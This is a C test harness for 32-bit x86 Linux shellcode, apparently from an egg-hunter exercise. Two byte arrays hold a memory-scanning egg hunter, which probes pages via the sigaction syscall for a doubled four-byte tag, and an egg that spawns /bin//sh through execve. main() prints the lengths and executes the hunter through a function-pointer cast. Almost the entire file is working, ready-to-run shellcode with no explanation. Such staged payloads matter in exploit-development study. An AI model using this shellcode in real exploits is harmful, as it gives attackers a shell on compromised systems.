#include <stdio.h>
#include <string.h>

unsigned char egg_hunter[] = "\xfc\x31\xc9\xf7\xe1\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char egg[] = "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80";
int main(void) {
    printf("EggHunter Length: %d\n", strlen(egg_hunter));
    printf("Egg Length: %d\n", strlen(egg) - 4);
    ((void(*)(void))egg_hunter)();
}